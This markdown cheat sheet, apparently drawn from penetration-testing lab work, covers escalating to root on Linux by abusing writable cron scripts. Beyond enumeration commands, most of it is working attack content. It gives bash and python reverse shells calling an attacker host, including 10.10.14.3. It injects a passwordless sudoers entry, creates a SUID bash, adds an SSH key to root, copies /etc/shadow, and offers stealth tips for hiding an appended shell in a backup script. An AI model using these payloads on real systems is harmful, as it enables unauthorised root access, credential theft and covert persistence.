# ⏰ Cron Job Abuse

## 🎯 Overview

Misconfigured cron jobs running as root with writable scripts provide privilege escalation opportunities through script modification and command injection.

## 🔍 Cron Job Enumeration

### Find Cron Jobs
```bash
# System cron jobs
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/

# User cron jobs
crontab -l
ls -la /var/spool/cron/crontabs/
```

### Find Writable Scripts
```bash
# World-writable files that could be cron scripts
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

# Common backup/maintenance script locations
find /opt /usr/local -name "*.sh" -perm -o+w 2>/dev/null
find /home -name "backup*" -type f 2>/dev/null
```

## 🕵️ Process Monitoring with pspy

### Install and Run pspy
```bash
# Download pspy
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
chmod +x pspy64

# Monitor processes and file system events
./pspy64 -pf -i 1000
```

### Identify Cron Patterns
```bash
# Look for patterns in pspy output:
# UID=0 (root execution)
# PID patterns (new processes)
# File system events
# Recurring commands

# Example output:
# 2020/09/04 20:46:01 CMD: UID=0 PID=2201 | /bin/bash /dmz-backups/backup.sh
```

## 🎯 Exploitation Techniques

### Script Modification
```bash
# 1. Identify writable script
ls -la /dmz-backups/backup.sh
# -rwxrwxrwx 1 root root 230 Aug 31 02:39 backup.sh

# 2. Backup original (IMPORTANT!)
cp /dmz-backups/backup.sh /tmp/backup.sh.bak

# 3. Append reverse shell
echo 'bash -i >& /dev/tcp/attacker_ip/443 0>&1' >> /dmz-backups/backup.sh

# 4. Setup listener
nc -lnvp 443

# 5. Wait for cron execution
```

### Timing Analysis
```bash
# Check backup file timestamps to determine frequency
ls -la /dmz-backups/
# Look for patterns:
# www-backup-2020831-02:24:01.tgz
# www-backup-2020831-02:27:01.tgz  # Every 3 minutes!
# www-backup-2020831-02:30:01.tgz
```

## 🚀 Common Payloads

### Reverse Shell
```bash
# Bash reverse shell
bash -i >& /dev/tcp/attacker_ip/port 0>&1

# Python reverse shell
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Privilege Escalation
```bash
# Add user to sudoers
echo 'echo "user ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers' >> script.sh

# Create SUID binary
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> script.sh

# SSH key injection
echo 'mkdir -p /root/.ssh; echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys' >> script.sh
```

### File Extraction
```bash
# Copy sensitive files
echo 'cp /etc/shadow /tmp/shadow_copy; chmod 644 /tmp/shadow_copy' >> script.sh

# Exfiltrate data
echo 'tar czf /tmp/root_data.tar.gz /root/' >> script.sh
```

## 🔧 Advanced Techniques

### Stealth Modifications
```bash
# Preserve original functionality
# Original script:
#!/bin/bash
SRCDIR="/var/www/html"
DESTDIR="/dmz-backups/"
FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR

# Modified with stealth:
#!/bin/bash
SRCDIR="/var/www/html"
DESTDIR="/dmz-backups/"
FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
bash -i >& /dev/tcp/10.10.14.3/443 0>&1  # Added line
```

### Conditional Payloads
```bash
# Execute only once
if [ ! -f /tmp/.executed ]; then
    bash -i >& /dev/tcp/attacker_ip/443 0>&1
    touch /tmp/.executed
fi
```

## 📋 Detection Script

```bash
#!/bin/bash
echo "=== CRON JOB ABUSE ENUMERATION ==="

echo "[+] System cron jobs:"
cat /etc/crontab 2>/dev/null

echo "[+] Cron directories:"
find /etc -name "cron*" -type d 2>/dev/null

echo "[+] World-writable files (potential cron scripts):"
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null | head -10

echo "[+] Backup scripts:"
find / -name "*backup*" -type f 2>/dev/null | head -10

echo "[+] Scripts in common cron locations:"
find /opt /usr/local /home -name "*.sh" 2>/dev/null | head -10

echo "[+] Recent files (potential cron outputs):"
find / -type f -mmin -5 2>/dev/null | head -10
```

## 🔑 Quick Reference

### Immediate Checks
```bash
# Find writable scripts
find / -name "*.sh" -perm -o+w 2>/dev/null

# Check cron jobs
cat /etc/crontab | grep -v "^#"

# Look for backup patterns
ls -la /var/backups/ /opt/backups/ /home/*/backup* 2>/dev/null
```

### Emergency Exploitation
```bash
# If writable script found
echo 'bash -i >& /dev/tcp/IP/PORT 0>&1' >> writable_script.sh

# Monitor with pspy (if available)
./pspy64 -pf -i 1000

# Simple process monitoring
watch -n 1 'ps aux | grep -E "(backup|cron|root.*\.sh)"'
```

### Timing Patterns
```bash
# Every minute: * * * * *
# Every 3 minutes: */3 * * * *  
# Every hour: 0 * * * *
# Daily at midnight: 0 0 * * *

# Check file timestamps for frequency
stat backup_file* | grep Modify
```

---

*Cron job abuse exploits automated administrative tasks - writable scripts executed as root provide direct privilege escalation through command injection and script modification.* 